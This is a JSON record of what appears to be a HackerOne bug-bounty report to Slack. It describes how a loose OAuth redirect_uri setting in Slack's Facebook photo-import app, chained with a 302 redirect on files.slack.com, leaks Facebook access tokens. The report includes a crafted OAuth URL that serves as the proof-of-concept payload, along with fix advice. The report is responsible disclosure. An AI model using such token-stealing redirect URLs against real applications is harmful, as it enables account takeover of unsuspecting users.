    "vulnerability_information_html": "<p>Hi,</p>\n\n<p>I noticed that your Facebook application used in the &quot;Import Photo&quot; can be used to take over the Facebook account of the user being attacked.</p>\n\n<p>It&#39;s multiple issues in one:</p>\n\n<ol>\n<li>You have a 302 redirect from a *.slack.com domain. Hash-values will follow the redirect.</li>\n<li>The Facebook application OAuth settings are too weak, and a files.slack.com-URL will be accepted as the redirect_uri. You should restrict these to a <a href=\"/redirect?signature=d50696058f3c5200e1417b0ce70049d29ccb06db&amp;url=http%3A%2F%2Fwww.slack.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.slack.com</span><i class=\"icon-external-link\"></i></a> that then redirects to the subdomain, instead of allowing all *.slack.com-subdomains, or deny the files.slack.com as a OAuth redirect-subdomain.</li>\n</ol>\n\n<p>So, the following URL will redirect the user to files.slack.com after authentication of the app (or if the user already has it approved, no client interaction is needed):</p>\n\n<p><a title=\"https://www.facebook.com/dialog/oauth?client_id=569627156411038&amp;redirect_uri=https%3A%2F%2Ffiles.slack.com%2Ffiles-pri%2FT025M9QPZ-F0283NJ20%2Fhash.swf&amp;response_type=token&amp;scope=user_photos&amp;sdk=joey\" href=\"/redirect?signature=4946dec5cad0a0d2e2ec1a99aced33a3b6662aac&amp;url=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D569627156411038%26redirect_uri%3Dhttps%253A%252F%252Ffiles.slack.com%252Ffiles-pri%252FT025M9QPZ-F0283NJ20%252Fhash.swf%26response_type%3Dtoken%26scope%3Duser_photos%26sdk%3Djoey\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.facebook.com/dialog/oauth?client_id=569627156411038&amp;redirect_uri=https%3A%2F%2Ffiles.slack.com%2Ffiles-pri%2FT025M9QPZ-F0283NJ20%2Fhash.swf&amp;response_type=token&amp;scope=user_photos&amp;sdk=joey</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>I have attached POC-images showing what happens and what the Token provides as it is today (you can modify the scope, the user needs to approve it, but it still looks legit coming from Slack).</p>\n\n<p>Regards,<br>\nFrans</p>\n", 
    "vulnerability_information": "Hi,\r\n\r\nI noticed that your Facebook application used in the \"Import Photo\" can be used to take over the Facebook account of the user being attacked.\r\n\r\nIt's multiple issues in one:\r\n1. You have a 302 redirect from a *.slack.com domain. Hash-values will follow the redirect.\r\n2. The Facebook application OAuth settings are too weak, and a files.slack.com-URL will be accepted as the redirect_uri. You should restrict these to a www.slack.com that then redirects to the subdomain, instead of allowing all *.slack.com-subdomains, or deny the files.slack.com as a OAuth redirect-subdomain.\r\n\r\nSo, the following URL will redirect the user to files.slack.com after authentication of the app (or if the user already has it approved, no client interaction is needed):\r\n\r\nhttps://www.facebook.com/dialog/oauth?client_id=569627156411038&redirect_uri=https%3A%2F%2Ffiles.slack.com%2Ffiles-pri%2FT025M9QPZ-F0283NJ20%2Fhash.swf&response_type=token&scope=user_photos&sdk=joey\r\n\r\nI have attached POC-images showing what happens and what the Token provides as it is today (you can modify the scope, the user needs to approve it, but it still looks legit coming from Slack).\r\n\r\nRegards,\r\nFrans\r\n\r\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://slack.com", 
            "about": "All your team communication in one place, instantly searchable, and available wherever you go.", 
            "twitter_handle": "slackhq", 
            "name": "Slack"
        }, 
        "handle": "slack", 
        "url": "https://hackerone.com/slack", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/069/a44d7bfd843f514c723441a5a40daf5bac8e9e38_small.png?1449082084", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 69, 
        "default_currency": "usd"
    }, 
    "is_published": false
}